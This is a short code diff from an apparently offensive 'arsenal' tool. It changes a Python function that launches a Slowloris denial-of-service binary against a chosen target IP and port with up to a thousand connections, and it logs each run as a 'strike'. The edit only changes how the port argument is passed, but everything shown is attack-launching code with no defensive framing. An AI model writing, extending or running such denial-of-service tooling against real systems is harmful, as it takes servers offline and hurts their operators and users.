@@ -28,7 +28,7 @@ def arsenal_slowloris(target_ip: str, port: str = "80", connections: int = 1000)
         return f"FATAL_ERROR: Slowloris binary missing at {binary}. Run 'shadowcypher_launch' to compile."
 
     try:
-        cmd = [binary, target_ip, str(port), str(connections)]
+        cmd = [binary, target_ip, port, str(connections)]
         task_id = runner.execute_task(f"SLOW_{target_ip}", cmd)
         logger.info("arsenal", f"STRIKE_ENGAGED: Slowloris targeting {target_ip}:{port} (Task: {task_id})")
         return f"SUCCESS: Slowloris strike initiated against {target_ip}:{port} with {connections} threads. Task ID: {task_id}"
